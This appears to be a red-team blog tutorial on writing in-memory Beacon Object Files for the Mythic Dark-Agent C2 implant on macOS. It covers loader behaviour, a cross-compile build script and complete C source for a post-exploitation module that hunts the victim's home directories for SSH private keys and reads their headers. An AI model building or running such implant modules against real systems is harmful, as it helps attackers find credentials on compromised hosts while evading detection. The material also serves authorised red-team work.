---
title: "Writing Beacon Object Files In Mythic Using Dark Agent For MacOS"
date: 2026-09-04
categories: [Red Team, Command and Control, Post-Exploitation, Defense Evasion, Mythic, Dark Agent, Beacon Object Files, BOFs, MacOS]
tags: [Mythic, Dark Agent, MacOS, Beacon Object Files, BOFs, Post-Exploitation, Defense Evasion, OpSec]
published: false
---

## Acknowledgements and Resources
Big shout out to **Nicholas Romanowski** and the development team at **ServiceNow** for building and open-sourcing [**Dark-Agent**](https://github.com/ServiceNow/Dark-Agent){:target="_blank" rel="noopener noreferrer"}, which brought clean, modular **in-memory BOF execution to macOS**. Having a reliable, extensible agent framework specifically targeted at **Apple Silicon** changes the game for **cross-platform operator** tooling, and digging through the loader implementation put together by **Nicholas** made mapping out this toolchain straightforward.

**Prerequisites & References:**

- [**Zig Compiler:**](https://ziglang.org/){:target="_blank" rel="noopener noreferrer"} Used for cross-compiling the raw ELF object files targeting `aarch64-linux-none`.
   
- **macOS SDK:** Required for native Apple libc struct layouts and headers (`MacOSX.sdk`).

**A Note on the Process:** Real talk: AI was heavily leaned on during the research and troubleshooting phase for this post. Bouncing compilation errors, ABI mismatches, and loader constraints off a model saves hours of painful guesswork when building custom operator tooling from scratch. As much as I would love to be, I'm not a bad lad that can just bang this stuff out on a Friday night. 

## Introduction

A **Beacon Object File (BOF)** is a small, unlinked object file containing code and data that a **C2 agent** loads and runs entirely in **memory**. It never touches **disk**, it never spawns a **process**, and it gives you a way to ship custom capability to an **implant** after it has already been deployed. **Cobalt Strike** made BOFs famous on **Windows**, but the same idea works on **macOS** through **Dark-Agent**, a **Mythic payload type** for **Apple Silicon**.

The catch is that a **BOF** is not a normal program. It is a raw **object file** that gets linked at runtime against the agent's own process, and that imposes a strict set of rules on how you write it. Get the rules right and a **BOF** is a tiny, fast, in-memory tool. Get them wrong and you could write a **BOF** that silently does nothing, or worse, write a **BOF** crashes the **beacon**.

In this walkthrough, we will go from a clean **Linux box** to a working **BOF** running inside a **Dark-Agent beacon** on a **Mac**. We will cover how the **loader** works, the **four rules** that make or break a **BOF**, the **build toolchain**, and a complete real world example. By the end, you will hopefully be able to write, build, and run your own **BOFs**.

## What is a Beacon Object File?
A **BOF** is a compiled **ELF object file** (a `.o` file), not an **executable**. It contains **machine code** and **data**, but it has not been linked (meaning its external references haven't been bound to actual memory addresses or final library functions yet). When you task the agent to run a **BOF**, the agent's **loader** reads the **object file**, copies its code and data into the **beacon process**, applies **relocations**, resolves any **external symbols** against the process's own **libraries**, and then calls a single **entry point function**.

This is what makes a **BOF** so useful. The code runs inside the already-running **beacon process**, so there is no **fork**, no **exec**, and nothing new appears in the **process list**. It is also what makes a **BOF** fragile. Because the **object file** is linked at runtime against a process it was not compiled for, every assumption you make about the **ABI** (Application Binary Interface, the low-level rules for how functions pass arguments, handle registers, and manage stack frames), the **data layout**, and the **symbol names** has to be correct.

## How Dark-Agent Loads a BOF
Before we write any code, we need to understand what the **loader** actually does. The **Dark-Agent loader** lives in the `src/dark/elf/` directory of the repository, and three behaviours matter more than anything else.

The **entry point** is `coffee`. The loader does not look for a function called `go` or `main`. It looks for a symbol named `coffee` and calls it as `coffee(int argc, char **argv)`. Your **BOF** must export a function with exactly that name and signature. The `argc` value includes the trailing **NULL terminator**, so if you pass two arguments, `argc` is three. Always loop with `while (i < argc && argv[i] != NULL)`.

Only `.rela.text` **relocations** are applied. When the **loader** copies your **object file** into **memory**, it applies **relocations** from the `.rela.text` section. This is the single most important limitation to understand. Any pointer that lives in the `.data` section, such as the initializer of a static const char *array[], is never relocated. Those pointers stay `NULL` at runtime.

**Symbols** resolve through `dlsym`. **External symbols** are resolved by looking them up in the process's loaded **libraries**. The **loader** strips a single leading **underscore** first, so a reference to `_stat` resolves to `stat`. This is why a **BOF** compiled for the **Linux ABI** can still call **Apple's libc**: the **symbol names** line up after the **underscore** is stripped.

## The Four Rules That Make or Break The BOF
Everything that follows is a direct consequence of how the **loader** works. These **four rules** are the difference between a **BOF** that runs and a **BOF** that crashes the **beacon**.

### Rule 1: No Variadic libc
A **Dark-Agent BOF** is compiled for `aarch64-linux-none`, the **Linux AArch64 ABI**, but its **symbols** resolve to **Apple's libc** inside the **beacon process**. The two **ABIs** disagree on how **variadic functions** pass their arguments. On **Linux**, `va_list` is a 24-byte struct. On **macOS**, it is a `char *`. When **Apple's** `printf` or `vsnprintf` reads a **Linux-style** `va_list`, it reads garbage and corrupts the **stack**, which crashes the **beacon** with a `SIGSEGV`.

This means you must never call `printf`, `snprintf`, `vsnprintf`, `sscanf`, or anything else that takes a `va_list`. Use the **Beacon API** for output and **non-variadic libc** for everything else. To format a number, write a small helper that converts an integer to a **decimal string** by hand.

### Rule 2: No Static Pointer Arrays
Because the **loader** only applies **.rela.text** **relocations**, a **static array of pointers** never gets its **initializers** fixed up. This code looks correct but silently does nothing:
```c
// WRONG - the pointers stay NULL at runtime
static const char *dirs[] = { "/.ssh", "/Documents", "/Desktop", NULL };
```
The array lives in `.data`, its **pointer initializers** are never **relocated**, and the **loop** that walks it never runs. Instead, embed your **strings inline** as **fixed-size character arrays**:
```c
// RIGHT - the strings live inline, no pointer relocations needed
typedef struct {
    char suffix[64];
} SearchDir;

static SearchDir dirs[] = {
    { "/.ssh" },
    { "/Documents" },
    { "/Desktop" },
    { "" }
};
```
The **sentinel** is an **empty string**, and the **loop** checks `dirs[i].suffix[0] != '\0'`.

### Rule 3: Use the macOS SDK Headers
The **BOF** runs against **Apple's libc**, so the **struct layouts** it reads must match **Apple's definitions**. `struct stat`, `struct passwd`, and `struct dirent` all have different **field offsets** on **macOS** than they do on **glibc**. If you compile against the **Linux headers**, your **BOF** will read the wrong **offsets** and produce **garbage** or crash. You must compile against the **macOS SDK headers**, which we cover in the **build environment section**.

### Rule 4: Build with Zig for aarch64-linux-none
The build is a **cross-compile**. We use **Zig** to compile **C source** into an **ELF object file** targeting `aarch64-linux-none`, while including the **macOS SDK headers**. The **Linux ABI** is intentional: it is what the **loader** expects, and the **symbol names** line up with **Apple's libc** after the **underscore strip**. We will walk through the exact command in the **build section**.

## The Beacon API
**Dark-Agent** exposes two **output callbacks** to your **BOF**. Declare them yourself at the top of your file:
```c
extern void BeaconPrintf(const char *fmt, ...);
extern void BeaconOutput(const char *data, int len);
```
`BeaconPrintf` only reliably supports `%s`. Its **format parser** recognises `%s`, `%d`, `%p`, and `%x`, but the **numeric specifiers** print the **pointer address**, not the value. If you pass `%d` with an **integer**, you get a **memory address** back. The rule is simple: convert every **number** to a **string** first, then pass it as `%s`. `BeaconPrintf` also appends a **newline** to every call, so you do not need to add `\n` yourself.

`BeaconOutput` writes a **raw buffer** of `len` bytes and appends a **newline**. Use it when you need to emit **data** that is not a simple **string**. Here is the **integer helper** used across the implementation. It replaces `snprintf("%llu")` and is safe because it is not **variadic**:
```c
// unsigned 64-bit -> decimal string (replaces snprintf("%llu"))
static void u64_to_str(unsigned long long n, char *out) {
    char tmp[24];
    int i = 0;
    if (n == 0) { out[0] = '0'; out[1] = '\0'; return; }
    while (n > 0) {
        tmp[i++] = (char)('0' + (int)(n % 10));
        n /= 10;
    }
    int j = 0;
    while (i > 0) out[j++] = tmp[--i];
    out[j] = '\0';
}
```
The libc functions that are safe to use are the non-variadic ones: `open`, `read`, `close`, `stat`, `opendir`, `readdir`, `closedir`, `getenv`, `getpwuid`, `getuid`, `malloc`, `free`, `memcpy`, `memmove`, `memset`, `memcmp`, `strcmp`, `strcasecmp`, `strcpy`, `strncat`, `strlen`, `strncpy`, and `strstr`. If a function takes `...`, do not use it.

## Setting Up the Build Environment
You need **three things**: a **Linux machine** (or **WSL**) to compile on, the **Zig compiler**, and the **macOS SDK headers**. You do not need a **Mac** to build, only to run the **beacon**.

### Step 1 - Install Zig
**Zig** is a single **binary**. Download it, extract it, and put it somewhere stable. `/opt/zig` is used throughout this guide:
```bash
# Download Zig (adjust the version to the latest release)
wget https://ziglang.org/download/0.11.0/zig-linux-x86_64-0.11.0.tar.xz
tar -xf zig-linux-x86_64-0.11.0.tar.xz
sudo mv zig-linux-x86_64-0.11.0 /opt/zig
/opt/zig/zig version
```
### Step 2 - Get the macOS SDK Headers
The **macOS SDK headers** come from **Xcode**. The cleanest way to obtain them is to copy the `MacOSX.sdk` directory from a **Mac** that has **Xcode** installed, or to pull a public **SDK mirror**. Place the **SDK** so that the **headers** are at a known path. This path is used throughout:
```bash
/opt/macos-sdk/MacOSX-SDKs/MacOSX11.3.sdk/usr/include
```
The exact **SDK version** is not critical, but the **headers** must be **Apple's**, not **glibc's**. This is a **hard requirement**, not a nice to have.

### Step 3 - Create the Build Script
The **build command** is long, so it is wrapped in a **script**. Create `build.sh`:
```bash
#!/bin/bash
set -euo pipefail

ZIG="${ZIG:-/opt/zig/zig}"
MACOS_SDK="${MACOS_SDK:-/opt/macos-sdk/MacOSX-SDKs/MacOSX11.3.sdk}"

MACOS_ZIG_TARGET="aarch64-linux-none"

mkdir -p output

build_one() {
    local src="$1"
    local base
    base="$(basename "$src" .c)"
    echo "[*] Compiling ${base}.c -> output/${base}.o (macOS aarch64)"
    "$ZIG" cc \
        -target "${MACOS_ZIG_TARGET}" \
        -I "${MACOS_SDK}/usr/include" \
        -D__aarch64__=1 -D__arm64__=1 \
        -DTARGET_MACOS=1 \
        -D_FORTIFY_SOURCE=0 \
        -fPIC -c "${src}" \
        -o "output/${base}.o" \
        -w
    echo "[+] Built output/${base}.o"
}

build_one hello.c

echo "[+] Done. BOF object files are in ./output/"
```
The flags do the following. `-target aarch64-linux-none` selects the **Linux AArch64 ABI**. `-I` points at the **macOS SDK headers**. `-D__aarch64__=1` and `-D__arm64__=1` satisfy the **SDK's architecture checks**. `-DTARGET_MACOS=1` is the flag **Dark-Agent's** own build uses. `-D_FORTIFY_SOURCE=0` disables the **fortified libc wrappers** that would otherwise pull in **variadic functions**. `-fPIC` and `-c` produce a **position-independent object file**.

## Writing Your First BOF
Write the smallest possible **BOF** to prove the whole **pipeline** works. Create `hello.c`:
```c
// hello.c - a minimal Dark-Agent BOF
#include <stdlib.h>
#include <string.h>

extern void BeaconPrintf(const char *fmt, ...);

// unsigned 64-bit -> decimal string (replaces snprintf("%llu"))
static void u64_to_str(unsigned long long n, char *out) {
    char tmp[24];
    int i = 0;
    if (n == 0) { out[0] = '0'; out[1] = '\0'; return; }
    while (n > 0) {
        tmp[i++] = (char)('0' + (int)(n % 10));
        n /= 10;
    }
    int j = 0;
    while (i > 0) out[j++] = tmp[--i];
    out[j] = '\0';
}

void coffee(int argc, char **argv) {
    BeaconPrintf("Hello from a Dark-Agent BOF");

    char nbuf[24];
    u64_to_str((unsigned long long)argc, nbuf);
    BeaconPrintf("argc = %s", nbuf);

    int i = 0;
    while (i < argc && argv[i] != NULL) {
        char ibuf[24];
        u64_to_str((unsigned long long)i, ibuf);
        BeaconPrintf("argv[%s] = %s", ibuf, argv[i]);
        i++;
    }
}
```
This tiny file demonstrates **every rule**. The **entry point** is `coffee`, not `main`. The only output is through `BeaconPrintf`. Every **number** is converted with `u64_to_str` and passed as `%s`. The **argument loop** stops at the **NULL terminator**. There is no **variadic libc** and no **static pointer array**.

## Building the BOF
Run the **build script**:
```bash
chmod +x build.sh
./build.sh
```
You should see output like this:
```
[*] Compiling hello.c -> output/hello.o (macOS aarch64)
[+] Built output/hello.o
[+] Done. BOF object files are in ./output/
```
The **result** is `output/hello.o`, a real **ELF object file**. You can confirm it is an **AArch64 object** with `file`:
```bash
file output/hello.o
```
## Loading and Running in Mythic
Upload `output/hello.o` to your **Mythic server**, then task the **Dark-Agent agent**. The **BOF** is loaded by name and then executed:
```
bof_load hello output/hello.o
bof_exec hello
bof_exec hello one two three
```
The first `bof_exec` prints `argc = 1` representing the single NULL terminator in the argument array. The second prints `argc = 4` and lists each **argument**. If that output appears, the entire **pipeline** works: the **toolchain**, the **loader**, and the **BOF**.

**A Note on Dark-Agent Argument Conventions:** Unlike standard C semantics where argc counts only the active arguments and argv[argc] is NULL, Dark-Agent's loader includes the trailing NULL terminator itself in the argc count. For example, running **bof_exec hello one two three** results in the following layout:
```plaintext
argv:
  [0] -> "one"
  [1] -> "two"
  [2] -> "three"
  [3] -> NULL

argc = 4
```

## A Real Example: The SSH Keys Finder
A **hello world** proves the **pipeline**, but a **real tool** shows the **pattern** in practice. The **SSH Keys Finder** scans **common locations** for **SSH private keys** and reports each key's **path**, **type**, **passphrase status**, and **size**. It is a **finder**, not an **extractor**, so it never reads **key contents** out of the process.

The **search directories** are embedded inline as **fixed-size character arrays**, exactly as **Rule 2** requires:
```c
typedef struct {
    char suffix[64];
} SearchDir;

static SearchDir dirs[] = {
    { "/.ssh" },
    { "/.ssh/backup" },
    { "/Documents" },
    { "/Downloads" },
    { "/Desktop" },
    { "" }
};
```
The directory scan uses only non-variadic libc:
```c
static void scan_dir(const char *dirpath, Key *keys, int *count) {
    DIR *d = opendir(dirpath);
    if (d == NULL) return;

    struct dirent *e;
    while ((e = readdir(d)) != NULL && *count < MAX_KEYS) {
        const char *name = e->d_name;
        if (name[0] == '.') continue;
        if (!is_key_name(name)) continue;

        char full[MAX_PATH];
        join2(full, sizeof(full), dirpath, name);

        struct stat st;
        if (stat(full, &st) != 0) continue;
        if (!S_ISREG(st.st_mode)) continue;

        strncpy(keys[*count].path, full, MAX_PATH - 1);
        keys[*count].path[MAX_PATH - 1] = '\0';
        keys[*count].size = (unsigned long long)st.st_size;
        inspect_key(full, keys[*count].type, sizeof(keys[*count].type),
                    keys[*count].pass, sizeof(keys[*count].pass));
        (*count)++;
    }
    closedir(d);
}
```
The **entry point** resolves the **home directory**, handles an optional `--dir` argument, and reports the **results**:
```c
void coffee(int argc, char **argv) {
    const char *home = getenv("HOME");
    if (home == NULL) {
        struct passwd *pw = getpwuid(getuid());
        home = (pw != NULL) ? pw->pw_dir : "/Users/Unknown";
    }

    const char *custom = NULL;
    int i = 0;
    while (i < argc && argv[i] != NULL) {
        const char *a = argv[i];
        if (strcmp(a, "--help") == 0 || strcmp(a, "-h") == 0) {
            BeaconPrintf("Usage: ssh_keys_finder [--dir <path>]");
            return;
        } else if (strcmp(a, "--dir") == 0 && (i + 1) < argc && argv[i + 1] != NULL) {
            custom = argv[i + 1];
            i++;
        }
        i++;
    }

    Key keys[MAX_KEYS];
    int count = 0;

    BeaconPrintf("SSH Keys Finder");
    BeaconPrintf("Home: %s", home);

    if (custom != NULL) {
        scan_dir(custom, keys, &count);
    } else {
        for (int d = 0; dirs[d].suffix[0] != '\0'; d++) {
            char dirpath[MAX_PATH];
            build_path(dirpath, sizeof(dirpath), home, dirs[d].suffix);

            struct stat st;
            if (stat(dirpath, &st) != 0 || !S_ISDIR(st.st_mode)) continue;

            scan_dir(dirpath, keys, &count);
        }
    }

    char countbuf[24];
    u64_to_str((unsigned long long)count, countbuf);
    BeaconPrintf("Found %s SSH key(s)", countbuf);
}
```
Notice the pattern that repeats throughout: no `printf`, no `snprintf`, no **static pointer array**, every **number** converted to a **string**, and the **argument loop** guarded by the **NULL terminator**.

### SSH Keys Finder BOF Source Code:
```c
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pwd.h>
#include <dirent.h>

// Dark-Agent Beacon API. Declared inline so this file compiles without
// needing the includes/ path wired up. These are SAFE (Crystal callbacks).
extern void BeaconPrintf(const char *fmt, ...);
extern void BeaconOutput(const char *data, int len);

#define MAX_PATH 1024
#define MAX_KEYS 64
#define KEY_BUF  4096   // enough for the PEM/OpenSSH header

// ------------------------------------------------------------------
// Search directories (home-relative suffixes, embedded inline — no
// pointer relocations). Sentinel = empty suffix.
// ------------------------------------------------------------------
typedef struct {
    char suffix[64];
} SearchDir;

static SearchDir dirs[] = {
    {"/.ssh"},
    {"/.ssh/backup"},
    {"/Documents"},
    {"/Downloads"},
    {"/Desktop"},
    {""}
};

// ------------------------------------------------------------------
// Key record
// ------------------------------------------------------------------
typedef struct {
    char path[MAX_PATH];
    char type[16];
    char pass[8];   // "yes" / "no"
    unsigned long long size;
} Key;

// ------------------------------------------------------------------
// Small non-variadic helpers
// ------------------------------------------------------------------

// unsigned 64-bit -> decimal string (replaces snprintf("%llu")).
static void u64_to_str(unsigned long long n, char *out) {
    char tmp[24];
    int i = 0;
    if (n == 0) { out[0] = '0'; out[1] = '\0'; return; }
    while (n > 0) {
        tmp[i++] = (char)('0' + (int)(n % 10));
        n /= 10;
    }
    int j = 0;
    while (i > 0) out[j++] = tmp[--i];
    out[j] = '\0';
}

// home + suffix -> out (no snprintf).
static void build_path(char *out, size_t outsz, const char *home, const char *suffix) {
    size_t used = 0;
    if (outsz == 0) return;
    while (*home && used < outsz - 1) out[used++] = *home++;
    while (*suffix && used < outsz - 1) out[used++] = *suffix++;
    out[used] = '\0';
}

// dir + "/" + name -> out (no snprintf).
static void join2(char *out, size_t outsz, const char *a, const char *b) {
    size_t used = 0;
    if (outsz == 0) return;
    while (*a && used < outsz - 1) out[used++] = *a++;
    if (used < outsz - 1) out[used++] = '/';
    while (*b && used < outsz - 1) out[used++] = *b++;
    out[used] = '\0';
}

// substring search in buf[0..len) for NUL-terminated needle.
static int contains(const char *buf, int len, const char *needle) {
    int nl = (int)strlen(needle);
    if (nl == 0) return 1;
    if (len < nl) return 0;
    for (int i = 0; i + nl <= len; i++) {
        if (memcmp(buf + i, needle, (size_t)nl) == 0) return 1;
    }
    return 0;
}

// Does this filename look like an SSH private key?
static int is_key_name(const char *name) {
    int nl = (int)strlen(name);
    if (contains(name, nl, ".pub")) return 0;          // public key
    if (strcmp(name, "known_hosts") == 0) return 0;
    if (strcmp(name, "known_hosts.old") == 0) return 0;
    if (strcmp(name, "authorized_keys") == 0) return 0;
    if (strcmp(name, "config") == 0) return 0;

    if (contains(name, nl, "id_")) return 1;
    if (contains(name, nl, "identity")) return 1;
    if (contains(name, nl, "_key")) return 1;
    if (contains(name, nl, "key_")) return 1;
    if (contains(name, nl, ".pem")) return 1;
    if (contains(name, nl, ".key")) return 1;
    if (contains(name, nl, ".ppk")) return 1;
    return 0;
}

// Read the key header and detect type + passphrase.
static void inspect_key(const char *path, char *type, size_t tsz,
                        char *pass, size_t psz) {
    strncpy(type, "unknown", tsz - 1); type[tsz - 1] = '\0';
    strncpy(pass, "no", psz - 1); pass[psz - 1] = '\0';

    int fd = open(path, O_RDONLY);
    if (fd < 0) return;

    char buf[KEY_BUF];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return;
    buf[n] = '\0';

    if (contains(buf, (int)n, "OPENSSH PRIVATE KEY")) {
        strncpy(type, "OpenSSH", tsz - 1);
    } else if (contains(buf, (int)n, "ED25519 PRIVATE KEY")) {
        strncpy(type, "ED25519", tsz - 1);
    } else if (contains(buf, (int)n, "RSA PRIVATE KEY")) {
        strncpy(type, "RSA", tsz - 1);
    } else if (contains(buf, (int)n, "EC PRIVATE KEY")) {
        strncpy(type, "EC", tsz - 1);
    } else if (contains(buf, (int)n, "DSA PRIVATE KEY")) {
        strncpy(type, "DSA", tsz - 1);
    }

    // PEM-encrypted keys carry "ENCRYPTED" in the header. OpenSSH-format
    // keys hide the cipher inside base64, so they are reported "no" here
    if (contains(buf, (int)n, "ENCRYPTED")) {
        strncpy(pass, "yes", psz - 1);
    }
}

// Scan one directory for key files, appending to keys[].
static void scan_dir(const char *dirpath, Key *keys, int *count) {
    DIR *d = opendir(dirpath);
    if (d == NULL) return;

    struct dirent *e;
    while ((e = readdir(d)) != NULL && *count < MAX_KEYS) {
        const char *name = e->d_name;
        if (name[0] == '.') continue;   // skip . and .. and hidden files
        if (!is_key_name(name)) continue;

        char full[MAX_PATH];
        join2(full, sizeof(full), dirpath, name);

        struct stat st;
        if (stat(full, &st) != 0) continue;
        if (!S_ISREG(st.st_mode)) continue;

        strncpy(keys[*count].path, full, MAX_PATH - 1);
        keys[*count].path[MAX_PATH - 1] = '\0';
        keys[*count].size = (unsigned long long)st.st_size;
        inspect_key(full, keys[*count].type, sizeof(keys[*count].type),
                    keys[*count].pass, sizeof(keys[*count].pass));
        (*count)++;
    }
    closedir(d);
}

// ------------------------------------------------------------------
// Entry point
// ------------------------------------------------------------------
void coffee(int argc, char **argv) {
    const char *home = getenv("HOME");
    if (home == NULL) {
        struct passwd *pw = getpwuid(getuid());
        home = (pw != NULL) ? pw->pw_dir : "/Users/Unknown";
    }

    // Optional --dir <path> to scan a single directory.
    const char *custom = NULL;
    int i = 0;
    while (i < argc && argv[i] != NULL) {
        const char *a = argv[i];
        if (strcmp(a, "--help") == 0 || strcmp(a, "-h") == 0) {
            BeaconPrintf("Usage: ssh_keys_finder [--dir <path>]");
            BeaconPrintf("  --dir <path>  scan only that directory (default: common locations)");
            return;
        } else if (strcmp(a, "--dir") == 0 && (i + 1) < argc && argv[i + 1] != NULL) {
            custom = argv[i + 1];
            i++;
        }
        i++;
    }

    Key keys[MAX_KEYS];
    int count = 0;

    BeaconPrintf("SSH Keys Finder");
    BeaconPrintf("Home: %s", home);

    if (custom != NULL) {
        BeaconPrintf("[*] Searching: %s", custom);
        scan_dir(custom, keys, &count);
    } else {
        for (int d = 0; dirs[d].suffix[0] != '\0'; d++) {
            char dirpath[MAX_PATH];
            build_path(dirpath, sizeof(dirpath), home, dirs[d].suffix);

            struct stat st;
            if (stat(dirpath, &st) != 0 || !S_ISDIR(st.st_mode)) continue;

            BeaconPrintf("[*] Searching: %s", dirpath);
            scan_dir(dirpath, keys, &count);
        }
    }

    BeaconPrintf("");
    if (count == 0) {
        BeaconPrintf("No SSH keys found");
    } else {
        for (int k = 0; k < count; k++) {
            char sizebuf[24];
            u64_to_str(keys[k].size, sizebuf);
            BeaconPrintf("[+] %s", keys[k].path);
            BeaconPrintf("    type=%s  passphrase=%s  size=%s",
                         keys[k].type, keys[k].pass, sizebuf);
        }
    }

    char countbuf[24];
    u64_to_str((unsigned long long)count, countbuf);
    BeaconPrintf("");
    BeaconPrintf("Found %s SSH key(s)", countbuf);
}

```

### The Smoke Test Pattern
Before you run a full **BOF** against a live **beacon**, run a minimal **safe version** first. The **SSH Keys Finder** ships with a second file, `ssh_keys_finder_scan.c`, that only locates each **search directory** and counts its **entries**. It never opens a **key file**. This confirms the **toolchain** and the **loader** work end to end without risking a **crash**. It is a habit worth keeping: every **BOF** should have a tiny, read-only **smoke test** you can run first.

### SSH Keys Finder Smoke Test Source Code:
```c
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pwd.h>
#include <dirent.h>

extern void BeaconPrintf(const char *fmt, ...);
extern void BeaconOutput(const char *data, int len);

#define MAX_PATH 1024

typedef struct {
    char suffix[64];
} SearchDir;

// Strings are embedded inline (fixed-size char arrays), NOT pointers, so
// the .data section needs no relocations. Sentinel = empty suffix.
static SearchDir dirs[] = {
    {"/.ssh"},
    {"/.ssh/backup"},
    {"/Documents"},
    {"/Downloads"},
    {"/Desktop"},
    {""}
};

// unsigned 64-bit -> decimal string (replaces snprintf("%llu")).
static void u64_to_str(unsigned long long n, char *out) {
    char tmp[24];
    int i = 0;
    if (n == 0) { out[0] = '0'; out[1] = '\0'; return; }
    while (n > 0) {
        tmp[i++] = (char)('0' + (int)(n % 10));
        n /= 10;
    }
    int j = 0;
    while (i > 0) out[j++] = tmp[--i];
    out[j] = '\0';
}

// home + suffix -> out (no snprintf).
static void build_path(char *out, size_t outsz, const char *home, const char *suffix) {
    size_t used = 0;
    if (outsz == 0) return;
    while (*home && used < outsz - 1) out[used++] = *home++;
    while (*suffix && used < outsz - 1) out[used++] = *suffix++;
    out[used] = '\0';
}

void coffee(int argc, char **argv) {
    (void)argc; (void)argv;   // no args for the smoke test

    const char *home = getenv("HOME");
    if (home == NULL) {
        struct passwd *pw = getpwuid(getuid());
        home = (pw != NULL) ? pw->pw_dir : "/Users/Unknown";
    }

    BeaconPrintf("Home directory: %s", home);
    BeaconPrintf("Scanning for SSH key locations...");

    int found = 0;
    for (int d = 0; dirs[d].suffix[0] != '\0'; d++) {
        char dirpath[MAX_PATH];
        build_path(dirpath, sizeof(dirpath), home, dirs[d].suffix);

        struct stat st;
        if (stat(dirpath, &st) != 0 || !S_ISDIR(st.st_mode)) {
            BeaconPrintf("%s: not present", dirpath);
            continue;
        }

        // Exercise opendir/readdir/closedir (the symbols the full BOF uses).
        int entries = 0;
        DIR *dd = opendir(dirpath);
        if (dd != NULL) {
            struct dirent *e;
            while ((e = readdir(dd)) != NULL) entries++;
            closedir(dd);
        }

        char ebuf[24];
        u64_to_str((unsigned long long)entries, ebuf);
        BeaconPrintf("Found %s (%s entries)", dirpath, ebuf);
        found++;
    }

    char countbuf[24];
    u64_to_str((unsigned long long)found, countbuf);
    BeaconPrintf("Found %s search location(s)", countbuf);
}
```

## Troubleshooting and Lessons Learned

| Symptom | Cause | Fix |
|---------|-------|-----|
| The beacon crashes with `SIGSEGV` | Variadic libc (`printf`, `snprintf`, `sscanf`) | Remove all variadic calls. Use `BeaconPrintf` and `u64_to_str`. |
| The loop silently never runs | A `static` pointer array in `.data` | Embed strings inline as fixed-size char arrays. |
| Numbers print as memory addresses | `%d`, `%p`, or `%x` in `BeaconPrintf` | Convert numbers to strings and pass them as `%s`. |
| Garbage or wrong values from `stat` or `readdir` | Compiled against glibc headers | Compile against the macOS SDK headers. |
| `bof_load` fails or the symbol is not found | The entry point is not named `coffee` | Rename your entry function to `coffee(int argc, char **argv)`. |
| Arguments are missing or off by one | The loop does not account for the NULL terminator | Loop with `while (i < argc && argv[i] != NULL)`. |


**The below shows the SSH Keys Finder BOF in action.** 
![Mythic Dark-Agent BOF Execution](assets/images/Mythic-DarkAgent-BOF/Writing-Beacon-Object-Files-for-Mythic-Dark-Agent.gif)

## Wrapping Up

And that's pretty much it. You now have the **blueprint**: how **Dark-Agent** loads a **BOF**, the **non-negotiable rules** for keeping the **process alive**, and the **cross-compilation toolchain** to make it happen. Between the **smoke test** and the full **SSH Keys Finder implementation**, you've got the **templates** ready to roll.

Time to grab a **real task** from your toolkit, port it over, and test it **in memory**. Start clean, keep it safe, and build out from there. But most importantly, **have fun!**
